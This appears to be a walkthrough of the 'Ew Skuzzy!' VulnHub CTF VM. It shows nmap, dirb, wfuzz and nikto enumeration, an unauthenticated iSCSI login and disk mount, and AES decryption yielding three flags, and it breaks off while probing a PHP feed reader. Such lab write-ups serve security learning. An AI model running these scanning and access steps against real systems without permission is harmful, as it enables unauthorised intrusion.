NetDiscover

```bash
root@kali:~# netdiscover -i eth0 -r 192.168.100.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.100.100 08:00:27:19:ab:1f      2     120  Cadmus Computer Systems     
 192.168.100.101 08:00:27:60:88:83      1      60  Cadmus Computer Systems     

root@kali:~# 
```

Target: 192.168.100.101

Nmap

```bash
root@kali:~# nmap -p- -A 192.168.100.101

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-05-03 10:03 CEST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.100.101
Host is up (0.00053s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)
|_  256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)
80/tcp   open  http    nginx
|_http-server-header: nginx
|_http-title: Welcome!
3260/tcp open  iscsi?
|_iscsi-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:60:88:83 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.100.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.57 seconds
root@kali:~# 
```

Curl on port 80

```bash
root@kali:~# curl http://192.168.100.101
<html>
<head>
<meta charset="UTF-8" />
<title>Welcome!</title>

</head>
<body>
<div style="width:500px; margin:0 auto;">
<pre>
    ______            _____ __                         __
   / ____/      __   / ___// /____  __________  __  __/ /
  / __/ | | /| / /   \__ \/ //_/ / / /_  /_  / / / / / / 
 / /___ | |/ |/ /   ___/ / ,< / /_/ / / /_/ /_/ /_/ /_/  
/_____/ |__/|__/   /____/_/|_|\__,_/ /___/___/\__, (_)   
                                             /____/      
</pre>
<font face="arial,helvetica">
Welcome to 'Ew Skuzzy!' - my first CTF VM. <br />
Level: Intermediate.<br /><br />

Forgive the name... I heard a kid say it in a shopping centre; Or, perhaps it's a hint? Or am I trolling? ¯\_(ツ)_/¯ <br /><br />

You'll just have to fireup dirbuster and find out! <br /><br />

Flags will be found along the way, if you're on the right path. <i>Most</i> flag data is not of any signifigance to the challenge.<br /><br />

Hints available at /dev/null, or ping me on Twitter <a href="https://twitter.com/vortexau">@vortexau</a> (UTC+9.5 timezone, I'm probably sleeping while you're awake!).<br /><br />

Please let me know what you think of the challenge once you're done, and submit your walkthroughs to VulnHub, I'm really looking forward to reading them!
</font>
</div>
</html>
root@kali:~# 
```

Directory bruteforce

```bash
root@kali:~# dirb http://192.168.100.101

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May  3 10:07:07 2017
URL_BASE: http://192.168.100.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.100.101/ ----
+ http://192.168.100.101/index.html (CODE:200|SIZE:1297)                                               
==> DIRECTORY: http://192.168.100.101/smblogin/                                                        
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/                                             
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/                                       
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/                                   
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/                          
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/                 
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/      
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/
+ http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/xmlrpc.php (CODE:200|SIZE:450)
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/ ----
==> DIRECTORY: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/
                                                                                                       
---- Entering directory: http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/ ----
+ http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/index.html (CODE:200|SIZE:527)
                                                                               hive/autodeploy/Links/pd
-----------------
END_TIME: Wed May  3 10:08:11 2017
DOWNLOADED: 119912 - FOUND: 3
root@kali:~# 
root@kali:~# nikto -C all -h http://192.168.100.101
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.100.101
+ Target Hostname:    192.168.100.101
+ Target Port:        80
+ Start Time:         2017-05-03 10:15:29 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx
+ Server leaks inodes via ETags, header found with file /, fields: 0x58b7fa74 0x511 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ 26165 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2017-05-03 10:16:45 (GMT2) (76 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 
root@kali:~# wfuzz -c -z file,/usr/share/seclists/Discovery/Web_Content/big.txt --hc 404,301 http://192.168.100.101/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.100.101/FUZZ/
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00009:  C=403     13 L	      82 W	    564 Ch	  ".htpasswd"
00026:  C=403     13 L	      82 W	    564 Ch	  ".htaccess"
16714:  C=403     13 L	      82 W	    564 Ch	  "smblogin"

Total time: 31.80431
Processed Requests: 20469
Filtered Requests: 20466
Requests/sec.: 643.5920

root@kali:~# wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc 404,301 http://192.168.100.101/FUZZ/
********************************************************
* Wfuzz 2.1.3 - The Web Bruteforcer                      *
********************************************************

Target: http://192.168.100.101/FUZZ/
Total requests: 207629

==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

41785:  C=200     32 L	     202 W	   1297 Ch	  ""
207628:  C=404     13 L	      84 W	    564 Ch	  "t5333"^C
Finishing pending requests...
root@kali:~# 
```

curl to the found url

```bash
root@kali:~# curl http://192.168.100.101/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/index.html
<html>
<head>
<title>Hello...</title>
</head>
<body bgcolor="black">

<div style="width:500px; margin:0 auto;">
<img src="flags.jpg" />

<!--
SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlv
dXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZl
ciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qg
d2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRl
bGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K
-->

</div>
</body>
</html>
root@kali:~# echo "SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlv
> dXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZl
> ciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qg
> d2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRl
> bGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K" | base64 -d
Hello, is it flags you're looking for?
I can see it in your eyes
I can see it in your smile
Flags are all I've ever wanted and my ports are open wide 
Cause you know just what to say and you know just what to do
And I want to tell you so much, no flags for you...
root@kali:~# 
```

Enum of port 3260

```bash
root@kali:~# apt-get install open-iscsi 
Lettura elenco dei pacchetti... Fatto
Generazione albero delle dipendenze       
Lettura informazioni sullo stato... Fatto
I seguenti pacchetti NUOVI saranno installati:
  open-iscsi
0 aggiornati, 1 installati, 0 da rimuovere e 1766 non aggiornati.
È necessario scaricare 0 B/291 kB di archivi.
Dopo quest'operazione, verranno occupati 1.408 kB di spazio su disco.
Preconfigurazione dei pacchetti in corso
Selezionato il pacchetto open-iscsi non precedentemente selezionato.
(Lettura del database... 422551 file e directory attualmente installati.)
Preparativi per estrarre .../open-iscsi_2.0.874-2_amd64.deb...
Estrazione di open-iscsi (2.0.874-2)...
Elaborazione dei trigger per initramfs-tools (0.125)...
update-initramfs: Generating /boot/initrd.img-4.6.0-kali1-amd64
setupcon: The keyboard model is unknown, assuming 'pc105'. Keyboard may be configured incorrectly.
Configurazione di open-iscsi (2.0.874-2)...
insserv: warning: current start runlevel(s) (empty) of script `iscsid' overrides LSB defaults (S).
insserv: warning: current stop runlevel(s) (0 1 6 S) of script `iscsid' overrides LSB defaults (0 1 6).
insserv: warning: current start runlevel(s) (empty) of script `open-iscsi' overrides LSB defaults (S).
insserv: warning: current stop runlevel(s) (0 1 6 S) of script `open-iscsi' overrides LSB defaults (0 1 6).
insserv: warning: current start runlevel(s) (empty) of script `open-iscsi' overrides LSB defaults (S).
insserv: warning: current stop runlevel(s) (0 1 6 S) of script `open-iscsi' overrides LSB defaults (0 1 6).
Elaborazione dei trigger per systemd (231-4)...
Elaborazione dei trigger per man-db (2.7.5-1)...
Elaborazione dei trigger per initramfs-tools (0.125)...
update-initramfs: Generating /boot/initrd.img-4.6.0-kali1-amd64
setupcon: The keyboard model is unknown, assuming 'pc105'. Keyboard may be configured incorrectly.
root@kali:~# 
root@kali:~# iscsiadm -m discovery -t st -p 192.168.100.101:3260
192.168.100.101:3260,1 iqn.2017-02.local.skuzzy:storage.sys0
root@kali:~#
root@kali:~# iscsiadm -m node -p 192.168.100.101 --login
Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.100.101,3260] (multiple)
Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.100.101,3260] successful.
root@kali:~#
```

check with fdisk new device /dev/sdb

```bash
root@kali:/media# fdisk --list
Disk /dev/sda: 40 GiB, 42949672960 bytes, 83886080 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xbecf30ae

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 79691775 79689728  38G 83 Linux
/dev/sda2       79693822 83884031  4190210   2G  5 Extended
/dev/sda5       79693824 83884031  4190208   2G 82 Linux swap / Solaris




Disk /dev/sdb: 1 GiB, 1073741824 bytes, 2097152 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
root@kali:/media#
root@kali:/media# mount -v /dev/sdb /media/tmp
mount: /dev/sdb mounted on /media/tmp.
root@kali:/media# 
```

Enumeration of new share and flag1

```bash
root@kali:/media# cd /media/tmp
root@kali:/media/tmp# ls
bobsdisk.dsk  flag1.txt  lost+found
root@kali:/media/tmp# cat flag1.txt 
Congratulations! You've discovered the first flag!

flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}

Let's see how you go with the next one...
root@kali:/media/tmp# 
```

From https://major.io/2010/12/14/mounting-a-raw-partition-file-made-with-dd-or-dd_rescue-in-linux/
mount bobsdisk.dsk

```bash
root@kali:/media/tmp# losetup /dev/loop2 bobsdisk.dsk
root@kali:/media/tmp# mkdir /media/bobdisk
root@kali:/media/tmp# mount /dev/loop2 /media/bobdisk
root@kali:/media/tmp# cd /media/bobdisk/
root@kali:/media/bobdisk# ls
lost+found  ToAlice.csv.enc  ToAlice.eml
root@kali:/media/bobdisk# 
```

Enumeration of bobdisk + flag2

```bash
root@kali:/media/bobdisk# cat ToAlice.eml 
G'day Alice,

You know what really annoys me? How you and I ended up being used, like some kind of guinea pigs, by the RSA crypto wonks as actors in their designs for public key crypto... I don't recall ever being asked if that was ok? I never got even one cent of royalties from them!? RSA have made Millions on our backs, and it's time we took a stand!

Starting now, today, immediately, I'm never using asymmetric key encryption again, and it's all symmetric keys from here on out. All my files and documents will be encrypted with that popular symmetric crypto algorithm. Uh. Yeah, I can't pronounce its original name. I don't even know what the letters in its other name stand for - but really - that's not important. A bloke at my local hackerspace says its the beez kneez, ridgy-didge, real-deal, the best there is when it comes to symmetric key crypto, he has heaps of stickers on his laptop so I guess it means he knows, right? Anyway, he said it won some big important competition among crypto geeks in October 2000? Lucky Y2K didn't happen then, I suppose or that would have been one boring party!

Anyway this algorithm sounded good to me. I used the updated version that won the competition.

You know what happened to me this morning? My kids, the little darlings, had spilled their fancy 256 bit Lego kit all over the damn floor. Sigh. Of course I trod on it making my coffee, the level of pain really does ROCKYOU to the core when it happens! It's hard to stay mad though, I really love Lego, the way those blocks chain togeather really does make them work brilliantly. My favourite new Spanish swear came in handy when this happened... supercalifragilisticoespialidoso !

Anyway, given I'm not not using asymmetric crypto any longer, I destroyed my private key, so the public key you have for me may as well be deleted. I've got some notes for you which might help in your current case, I've encrypted it using my new favourite symmetric key crypto algorithm, it should be on the disk with this note. The key is, well, one awesome word I learnt in my recent Spanish classes!

Give me a shout when you're down this way again, we'll catch up for coffee (once the Lego is removed from my foot) :)

Cheers,

Bob.

PS: Oh, before I forget, the hacker-kid who told me how to use this new algorithm, said it was very important I used the command option -md sha256 when decrypting. Why? Who knows? He said something about living on the bleeding-edge...

PPS: flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}

root@kali:/media/bobdisk# 
root@kali:/media/bobdisk# file ToAlice.csv.enc 
ToAlice.csv.enc: openssl enc'd data with salted password
root@kali:/media/bobdisk# 
```

From http://stackoverflow.com/questions/16056135/how-to-use-openssl-to-encrypt-decrypt-files
Decrypt + flag3

```bash
root@kali:/media/bobdisk# openssl enc -d -aes-256-cbc -in ToAlice.csv.enc -out ToAlice.csv -md SHA256
enter aes-256-cbc decryption password:
root@kali:/media/bobdisk# ls
lost+found  ToAlice.csv  ToAlice.csv.enc  ToAlice.eml
root@kali:/media/bobdisk# cat ToAlice.csv
Web Path,Reason
5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site! 
c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? What is it?
root@kali:/media/bobdisk# 
```

Enum websites

```bash
gle. Firefox is still rocking the marquee tag Geocities style though! 
-->
<img src="hacker.jpg" />
</center>
</body>
</html>
<!-- 
R2VvcmdlIENvc3RhbnphOiBbU291cCBOYXppIGdpdmVzIGhpbSBhIGxvb2tdIE1lZGl1bSB0dXJr
ZXkgY2hpbGkuIApbaW5zdGFudGx5IG1vdmVzIHRvIHRoZSBjYXNoaWVyXSAKSmVycnkgU2VpbmZl
bGQ6IE1lZGl1bSBjcmFiIGJpc3F1ZS4gCkdlb3JnZSBDb3N0YW56YTogW2xvb2tzIGluIGhpcyBi
YWcgYW5kIG5vdGljZXMgbm8gYnJlYWQgaW4gaXRdIEkgZGlkbid0IGdldCBhbnkgYnJlYWQuIApK
ZXJyeSBTZWluZmVsZDogSnVzdCBmb3JnZXQgaXQuIExldCBpdCBnby4gCkdlb3JnZSBDb3N0YW56
YTogVW0sIGV4Y3VzZSBtZSwgSSAtIEkgdGhpbmsgeW91IGZvcmdvdCBteSBicmVhZC4gClNvdXAg
TmF6aTogQnJlYWQsICQyIGV4dHJhLiAKR2VvcmdlIENvc3RhbnphOiAkMj8gQnV0IGV2ZXJ5b25l
IGluIGZyb250IG9mIG1lIGdvdCBmcmVlIGJyZWFkLiAKU291cCBOYXppOiBZb3Ugd2FudCBicmVh
ZD8gCkdlb3JnZSBDb3N0YW56YTogWWVzLCBwbGVhc2UuIApTb3VwIE5hemk6ICQzISAKR2Vvcmdl
IENvc3RhbnphOiBXaGF0PyAKU291cCBOYXppOiBOTyBGTEFHIEZPUiBZT1UK
-->
root@kali:/media/bobdisk# echo "R2VvcmdlIENvc3RhbnphOiBbU291cCBOYXppIGdpdmVzIGhpbSBhIGxvb2tdIE1lZGl1bSB0dXJr
> ZXkgY2hpbGkuIApbaW5zdGFudGx5IG1vdmVzIHRvIHRoZSBjYXNoaWVyXSAKSmVycnkgU2VpbmZl
> bGQ6IE1lZGl1bSBjcmFiIGJpc3F1ZS4gCkdlb3JnZSBDb3N0YW56YTogW2xvb2tzIGluIGhpcyBi
> YWcgYW5kIG5vdGljZXMgbm8gYnJlYWQgaW4gaXRdIEkgZGlkbid0IGdldCBhbnkgYnJlYWQuIApK
> ZXJyeSBTZWluZmVsZDogSnVzdCBmb3JnZXQgaXQuIExldCBpdCBnby4gCkdlb3JnZSBDb3N0YW56
> YTogVW0sIGV4Y3VzZSBtZSwgSSAtIEkgdGhpbmsgeW91IGZvcmdvdCBteSBicmVhZC4gClNvdXAg
> TmF6aTogQnJlYWQsICQyIGV4dHJhLiAKR2VvcmdlIENvc3RhbnphOiAkMj8gQnV0IGV2ZXJ5b25l
> IGluIGZyb250IG9mIG1lIGdvdCBmcmVlIGJyZWFkLiAKU291cCBOYXppOiBZb3Ugd2FudCBicmVh
> ZD8gCkdlb3JnZSBDb3N0YW56YTogWWVzLCBwbGVhc2UuIApTb3VwIE5hemk6ICQzISAKR2Vvcmdl
> IENvc3RhbnphOiBXaGF0PyAKU291cCBOYXppOiBOTyBGTEFHIEZPUiBZT1UK" | base64 -d
George Costanza: [Soup Nazi gives him a look] Medium turkey chili. 
[instantly moves to the cashier] 
Jerry Seinfeld: Medium crab bisque. 
George Costanza: [looks in his bag and notices no bread in it] I didn't get any bread. 
Jerry Seinfeld: Just forget it. Let it go. 
George Costanza: Um, excuse me, I - I think you forgot my bread. 
Soup Nazi: Bread, $2 extra. 
George Costanza: $2? But everyone in front of me got free bread. 
Soup Nazi: You want bread? 
George Costanza: Yes, please. 
Soup Nazi: $3! 
George Costanza: What? 
Soup Nazi: NO FLAG FOR YOU
root@kali:/media/bobdisk#
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>

</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# 
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=reader
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
}
</style>
</head>
<body>

<div class="container">

<header>
   <h1>My great web-app!</h1>
</header>
  
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>

<article>
<h1>Feed Reader</h1>
<a href="?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt">Load Feed</a>
</article>

<footer>Hack the Planet!</footer>

</div>

</body>
</html>

root@kali:/media/bobdisk# 
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/data.txt
##text##
This is some example source data for my nice little feed reader. I have designed my own nice little format which will allow it to include dynamic content. Who needs consultants when it's this easy? :) 

One of the best things is this will allow me to host my feed content to display on this page on an external server! So flexible :D
##text##

##php##
print("See? This is totally dynamic, generated by PHP right in my own little tool. Hacker proof, too, because there is a secret key required!");
##php##
root@kali:/media/bobdisk# 
```

Calling different urls shows that the file gets embedded into the <article></article> tag

```bash
root@kali:/media/bobdisk# curl http://192.168.100.101/c2444910794e037ebd8aaf257178c90b/?p=flag
<!DOCTYPE html>
<html>
<head>
<title>I think you're on the right track now!</title>
<style>
div.container {
    width: 100%;
    border: 1px solid gray;
}

header, footer {
    padding: 1em;
    color: white;
    background-color: black;
    clear: left;
    text-align: center;
}

nav {
    float: left;
    max-width: 160px;
    margin: 0;
    padding: 1em;
}

nav ul {
    list-style-type: none;
    padding: 0;
}
   
nav ul a {
    text-decoration: none;
}

article {
    margin-left: 170px;
    border-left: 1px solid gray;
    padding: 1em;
    overflow: hidden;
